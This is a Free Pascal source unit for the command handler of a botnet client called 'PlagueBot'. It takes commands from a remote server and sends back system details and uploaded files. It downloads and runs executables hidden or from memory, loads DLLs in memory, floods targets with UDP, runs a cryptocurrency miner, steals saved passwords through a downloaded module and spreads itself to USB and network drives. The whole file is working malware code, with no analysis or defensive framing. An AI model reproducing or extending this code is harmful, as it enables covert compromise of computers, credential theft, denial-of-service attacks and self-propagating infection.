unit CmdWorker;

{$mode objfpc}{$H+}

interface

uses
  NetModule, Tools, Spread,
  Classes, SysUtils, IdMultipartFormData, Process, IdHTTP, WExecFromMem,
  BTMemoryModule, IdUDPClient;

type
  TCmdWorker = class(TThread)
  Hat: TIdHTTP;
  ToPost: TIdMultipartFormDataStream;
  private
    FCmdID: String;
    FIndex: LongInt;
    procedure DownloadFile(URL: String; var MS: TMemoryStream);
    function ExecuteModule(URL, Params: String; Drop: Boolean = False): Cardinal;
  public
    property Identifier: String read FCmdID write FCmdID;
    constructor Create(CmdID: String; Index: LongInt);
    destructor Destroy; override;
    procedure Execute; override;
    procedure Abort(AbortID: String);
  end;

  TWorkers = Array of TCmdWorker;

var
  Workers: TWorkers;
  AllowExecution: Boolean = true;
  IsUninstalling: Boolean = false;
  IsRestarting:   Boolean = false;
  IsUpdating:     Boolean = false;

function ExecIndex(CmdID: String): LongInt;
function FindAPlace: LongInt;

implementation

//Functions used by commands

procedure TCmdWorker.DownloadFile(URL: String; var MS: TMemoryStream);
Begin
  try
    Hat.Get(URL, MS);
  except
  end;
  MS.Position:=0;
end;

function TCmdWorker.ExecuteModule(URL, Params: String; Drop: Boolean = False): Cardinal;
var
  MS: TMemoryStream;
  M:  TProcess;
Begin
  MS:=TMemoryStream.Create;
  try
    DownloadFile(URL, MS);
    ToggleCrypt(MS, 7019);
    if Drop then Begin
      MS.SaveToFile('winmod.exe');
      Sleep(2000);
      if FileExists('winmod.exe') then Begin
         M:=TProcess.Create(Nil);
        try
          M.Executable:='winmod.exe';
          M.Parameters.Add(Params);
          M.ShowWindow:=swoHIDE;
          M.Execute;
          Result:=M.ProcessID;
        except
          on E: Exception do Result:=0;
        end;
        M.Free;
      end else Result:=0;
    end else
      Result:=ExecFromMem(FullName, Params, MS.Memory);
  except
    on E: Exception do Result:=0;
  end;
  MS.Free;
  AddProcessToList(Result);
end;

//General functions and Command Execution

function FindAPlace: LongInt;
var
  J: LongInt;
  Found: Boolean;
Begin
  Result:=0;
  Found:=False;
  For J:=Low(Workers) to High(Workers) do
  if Not(Assigned(Workers[J])) then Begin
    Result:=J;
    Found:=True;
    Break;
  end;
  if Not(Found) then Begin
    J:=High(Workers) + 1;
    SetLength(Workers, J + 1);
    Result:=J;
  end;
end;

function ExecIndex(CmdID: String): LongInt;
var
  J: LongInt;
Begin
  Result:=-1;
  For J:=Low(Workers) to High(Workers) do
  if Assigned(Workers[J]) then
  if Workers[J].Identifier=CmdID then Begin
    Result:=J;
    Break;
  end;
end;

constructor TCmdWorker.Create(CmdID: String; Index: LongInt);
Begin
  FreeOnTerminate:=True;
  FCmdID:=CmdID;
  FIndex:=Index;
  Hat:=TIdHTTP.Create(Nil);
  Hat.HandleRedirects:=True;
  if UsingProxy then Begin
    Hat.ProxyParams.ProxyServer:=ProxyIP;
    Hat.ProxyParams.ProxyPort:=ProxyPort;
  end;
  inherited Create(False);
end;

destructor TCmdWorker.Destroy;
Begin
  Hat.Free;
  ToPost.Free;
  inherited Destroy;
  Workers[FIndex]:=Nil;
  if FIndex=High(Workers) then SetLength(Workers, FIndex);
end;

procedure TCmdWorker.Abort(AbortID: String);
var
  _ToPost: TIdMultipartFormDataStream;
Begin
  _ToPost:=TIdMultipartFormDataStream.Create;
  _ToPost.AddFormField('GUID', ID);
  _ToPost.AddFormField('ID', AbortID);
  _ToPost.AddFormField('RT', '1');
  _ToPost.AddFormField('Result', 'Abort successful.');
  Hat.Post(Server+ResultsPHP, _ToPost);
  {$IFDEF Debug}
  Writeln('[',FIndex,'] ABORT');
  {$ENDIF}
  _ToPost.Free;
  Terminate;
end;

procedure TCmdWorker.Execute;
var

  Master: TProcess;
  MemStream: TMemoryStream;
  FFile: Text;
  Error: Boolean = False;

  ModID: Cardinal;

  MemDLLData: Pointer;
  MemDLLModule: PBTMemoryModule;

  UP: TIdUDPClient;
  STemp, STemp2, CmdType: String;

  procedure DoPost;
  var {%H-}Q: String;
  Begin
    ToPost.AddFormField('GUID', ID);
    ToPost.AddFormField('ID', FCmdID);
    Q:='';
    try
     Q:=Hat.Post(Server+ResultsPHP, ToPost);
    except
    end;
    {$IFDEF Debug}
    Writeln('[',FIndex,'] CMD-POST --> ',Q);
    {$ENDIF}
    ToPost.Clear;
  end;

Begin
  Hat.Request.Connection:='keep-alive';
  Hat.Request.UserAgent:='PlagueBot';
  ToPost:=TIdMultipartFormDataStream.Create;
  CmdType:=Net.Commands.ReadString(FCmdID, 'Type', '');
  //STRING TABLE
    if CmdType=GetProtectedString(1) then CmdType:='bb32d835'
    else if CmdType=GetProtectedString(2) then CmdType:='896bb1db';
  //END STRING TABLE
  try
  Case CmdType of
    'Register': Begin
      ToPost.AddFormField('RT', '3');

      AnalyzeSystem;
      ToPost.AddFormField('Nick', Nick);
      ToPost.AddFormField('OS', OS);
      ToPost.AddFormField('Comp', ComputerName);
      ToPost.AddFormField('User', UserName);
      ToPost.AddFormField('CPU', CPU);
      ToPost.AddFormField('GPU', GPU);
      ToPost.AddFormField('Anti', AVName);
      ToPost.AddFormField('Def', AVState);
      ToPost.AddFormField('Inf', Settings.ReadString('General', 'InfectedBy', 'Unknown'));
      DoPost;
    end;
    'Restart': Begin
      ToPost.AddFormField('RT', '1');
      ToPost.AddFormField('Result', 'Restarting.');
      DoPost;
      IsRestarting:=True;
      AllowExecution:=False;
    end;
    'Update': Begin
      ToPost.AddFormField('RT', '1');
      MemStream:=TMemoryStream.Create;
      try
        DownloadFile(
            Net.Commands.ReadString(FCmdID, 'URL', ''),
            MemStream);
        RenameFile(FullName, FileName+'.old');
        MemStream.SaveToFile(FullName);
      except
        on E: Exception do Begin
          Error:=True;
          ToPost.AddFormField('Result', 'Update failed: '+E.Message);
          DoPost;
        end;
      end;
      MemStream.Free;
      if Not(Error) then Begin
        ToPost.AddFormField('Result', 'File downloaded, update in progress.');
        DoPost;
        IsUpdating:=True;
        AllowExecution:=False;
      end;
    end;
    'UpdateMap': Begin
      ToPost.AddFormField('RT', '1');
      Settings.WriteString('General', 'SecMapping', Net.Commands.ReadString(FCmdID, 'URL', ''));
      FileSetAttr(FullName, faNormal);
      RenameFile(FullName, FileName+'.old');
      if ChCopy(FullName+'.old', FullName) then Begin
        UpdateResourceSettings(FileName);
        ToPost.AddFormField('Result', 'Secondary Mapping updated!');
        DoPost;
        IsUpdating:=True;
        AllowExecution:=False;
      end else Begin
        RenameFile(FullName+'.old', FileName);
        ToPost.AddFormField('Result', 'Failed to update the Secondary Mapping!');
        DoPost;
      end;
    end;
    'Uninstall': Begin
      IsUninstalling:=True;
      ToPost.AddFormField('RT', '1');
      ToPost.AddFormField('Result','Uninstalling...');
      DoPost;
      IsUninstalling:=True;
      AllowExecution:=False;
    end;
    'Upload': Begin
      if FileExists(Net.Commands.ReadString(FCmdID, 'FileName', '')) then Begin
        ToPost.AddFormField('RT', '2');
        ToPost.AddFile('File', Net.Commands.ReadString(FCmdID, 'FileName', ''));
      end else Begin
        ToPost.AddFormField('RT', '1');
        ToPost.AddFormField('Result', 'The specified file does not exist.');
      end;
      DoPost;
    end;
    'Download': Begin
      ToPost.AddFormField('RT', '1');
      MemStream:=TMemoryStream.Create;
      try
        DownloadFile(
            Net.Commands.ReadString(FCmdID, 'URL', ''),
            MemStream);
        MemStream.SaveToFile(Net.Commands.ReadString(FCmdID, 'LocalName', 'Temp.tmp'));
      except
        on E: Exception do Begin
          Error:=True;
          ToPost.AddFormField('Result', 'Download failed: '+E.Message);
        end;
      end;
      MemStream.Free;
      if Not(Error) then
        ToPost.AddFormField('Result', 'ododd');
      DoPost;
    end;
    '896bb1db': Begin
      ToPost.AddFormField('RT', '1');
      MemStream:=TMemoryStream.Create;
      try
        DownloadFile(
            Net.Commands.ReadString(FCmdID, 'URL', ''),
            MemStream);
        MemStream.SaveToFile('Drop.exe');
      except
        on E: Exception do Begin
          Error:=True;
          ToPost.AddFormField('Result', 'Download failed: '+E.Message);
        end;
      end;
      MemStream.Free;
      if Not(Error) then Begin
        if FileExists('Drop.exe') then Begin
          Master:=TProcess.Create(Nil);
          try
            Master.Executable:='Drop.exe';
            Master.ShowWindow:=swoHIDE;
            Master.InheritHandles:=False;
            Master.Execute;
            AddProcessToList(Master.ProcessID);
            ToPost.AddFormField('Result', 'Execution successful.');
            ToPost.AddFormField('Continue', 'True');
            DoPost;
            While (Not(Terminated)) and (Master.Running) do Begin
              Sleep(100);
            end;
            RemoveProcessFromList(Master.ProcessID);
            Master.Terminate(0);
            ToPost.AddFormField('RT', '1');
          except
            on E: Exception do Begin
              Error:=True;
              ToPost.AddFormField('Result', 'Execution failed: '+E.Message);
            end;
          end;
          Master.Free;
          if Not(Error) then ToPost.AddFormField('Result', 'Execution completed.');
        end else ToPost.AddFormField('Result', 'The dropped file doesn''t exist!');
      end;
      DoPost;
      ChDel('Drop.exe');
    end;
    'bb32d835': Begin
      ToPost.AddFormField('RT', '1');
      MemStream:=TMemoryStream.Create;
      try
        DownloadFile(
            Net.Commands.ReadString(FCmdID, 'URL', ''),
            MemStream);
      except
        on E: Exception do Begin
          Error:=True;
          ToPost.AddFormField('Result', 'Download failed: '+E.Message);
        end;
      end;
      if Not(Error) then Begin
        ModID:=ExecFromMem(FullName, '', MemStream.Memory);
        if ModID>0 then Begin
          AddProcessToList(ModID);
          ToPost.AddFormField('Result', 'Execution successful.');
          ToPost.AddFormField('Continue', 'True');
          DoPost;
          While Not(Terminated) do Begin
            Sleep(100);
          end;
          RemoveProcessFromList(ModID);
          TerminateProcessByID(ModID);
          ToPost.AddFormField('RT', '1');
          ToPost.AddFormField('Result', 'Execution completed.');
        end
        else ToPost.AddFormField('Result', 'Execution failed!');
      End;
      MemStream.Free;
      DoPost;
    end;
    'MemDLL': Begin
      ToPost.AddFormField('RT', '1');
      MemStream:=TMemoryStream.Create;
      try
        DownloadFile(
            Net.Commands.ReadString(FCmdID, 'URL', ''),
            MemStream);
      except
        on E: Exception do Begin
          Error:=True;
          ToPost.AddFormField('Result', 'Download failed: '+E.Message);
        end;
      end;
      if Not(Error) then Begin
        MemDLLData:=GetMemory(MemStream.Size);
        MemStream.Read(MemDLLData^, MemStream.Size);
        MemDLLModule:=BTMemoryModule.BTMemoryLoadLibary(MemDLLData, MemStream.Size);
        if MemDLLModule<>Nil then Begin
          ToPost.AddFormField('Result', 'Execution successful.');
          ToPost.AddFormField('Continue', 'True');
          DoPost;
          While Not(Terminated) do Begin
            Sleep(100);
          end;
          BTMemoryModule.BTMemoryFreeLibrary(MemDLLModule);
          ToPost.AddFormField('RT', '1');
          ToPost.AddFormField('Result', 'Module freed!');
        end
        else ToPost.AddFormField('Result', 'Failed to load the DLL into memory: '+
        BTMemoryModule.BTMemoryGetLastError);
      end;
      MemStream.Free;
      DoPost;
    end;
    'Flood': Begin
      ToPost.AddFormField('RT', '1');
      UP:=TIdUDPClient.Create(Nil);
      UP.Host:=Net.Commands.ReadString(FCmdID, 'IPAddress',
        Settings.ReadString('Flood', 'DefaultIP', '1.1.1.1'));
      UP.Port:=Net.Commands.ReadInt64(FCmdID, 'Port',
        Settings.ReadInt64('Flood', 'Port', 80));
      STemp:=Settings.ReadString('Flood', 'Message', 'A cat is fine too. Desudesudesu~');
      if Settings.ReadBool('Flood', 'MaxPower', True) then Begin
        While Not(Terminated) do Begin
          UP.Send(STemp);
        end;
      end else Begin
        While Not(Terminated) do Begin
          UP.Send(STemp);
          Sleep(1);
        end;
      end;
      UP.Free;
      ToPost.AddFormField('Result', 'Flood over!');
      DoPost;
    end;
    'Mine': Begin
      ToPost.AddFormField('RT', '1');
      Randseed:=Discriminator;
      STemp2:='P'+IntToStr(Random(100) + 1);
      try
        //Download config
        STemp:=StringReplace(Hat.Get(Server+MineConfig), '%WorkerID%', STemp2,
          [rfReplaceAll, rfIgnoreCase]);
        AssignFile(FFile, GetProtectedString(0));
        Rewrite(FFile);
        Write(FFile, STemp);
        CloseFile(FFile);
        //Choose miner
        STemp:=Server;
        if Pos('64', Net.Commands.ReadString(FCmdID, 'Bitness', '32'))>0 then
          STemp += MineModule64
        else
          STemp += MineModule;
        //Start mining
        ModID:=ExecuteModule(STemp, '', True);
        if ModID>0 then Begin
          ToPost.AddFormField('Result', '['+STemp2+'] started mining!');
          ToPost.AddFormField('Continue', 'True');
          DoPost;
          While Not(Terminated) do Begin
            Sleep(100);
          end;
          RemoveProcessFromList(ModID);
          TerminateProcessByID(ModID);
          ToPost.AddFormField('RT', '1');
          ToPost.AddFormField('Result', '['+STemp2+'] stopped mining!');
        end
        else Begin
          ToPost.AddFormField('Result', 'Failed to start the mining process.');
        end;
      except
        on E: Exception do
          ToPost.AddFormField('Result', 'Mining exception: '+E.Message);
      end;
      ChDel('winmod.exe');
      DoPost;
    end;
    'Passwords': Begin
      Error:=True; //Not feeling too positive today
      ModID:=ExecuteModule(Server+PassModule, '/shtml P.html');
      if ModID>0 then Begin
        Sleep(7000);
        RemoveProcessFromList(ModID);
        if FileExists('P.html') then Begin
          Error:=False;
          ToPost.AddFormField('RT', '2');
          ToPost.AddFile('File', 'P.html');
        end;
      end;
      if Error then Begin
        ToPost.AddFormField('RT', '1');
        ToPost.AddFormField('Result', 'Failed to execute the password module.');
      end;
      DoPost;
      Sleep(700);
      ChDel('P.html');
    end;
    'OpenURL': Begin
      Sleep(Random(5*60*1000)+1);
      ToPost.AddFormField('RT', '1');
      OpenURL(Net.Commands.ReadString(FCmdID, 'URL', 'http://google.com'));
      ToPost.AddFormField('Result', 'URL opened successfully.');
      DoPost;
    end;
    'Spread': Begin
      ToPost.AddFormField('RT', '1');
      //Create clone
      if CreateClone('Clone.tmp') then Begin
        ToPost.AddFormField('Result', 'Spreading routine started.');
        ToPost.AddFormField('Continue', 'True');
        DoPost;
        While Not(Terminated) do Begin
          InfectUSBDrives;
          InfectNetworkDrives;
          Sleep(1000);
        end;
        //Remove clone
        ChDel('Clone.tmp');
        ToPost.AddFormField('RT', '1');
        ToPost.AddFormField('Result', 'Spreading routine ended.');
        DoPost;
      end else Begin
        ToPost.AddFormField('Result', 'Failed to create a clone.');
        DoPost;
      end;
    end
    else Begin
      ToPost.AddFormField('RT', '1');
      ToPost.AddFormField('Result', 'Unknown command!');
      DoPost;
    end;
  end;
  except
    on E: Exception do Begin
      ToPost.Clear;
      ToPost.AddFormField('RT', '1');
      ToPost.AddFormField('Result', 'Fatal exception: '+E.Message);
      DoPost;
    end;
  end;
  {$IFDEF Debug}
  Writeln('Thread [',FIndex,'] exited.');
  {$ENDIF}
  Sleep(1000); //Used to prevent the client from accidentally performing the same command again
end;

end.

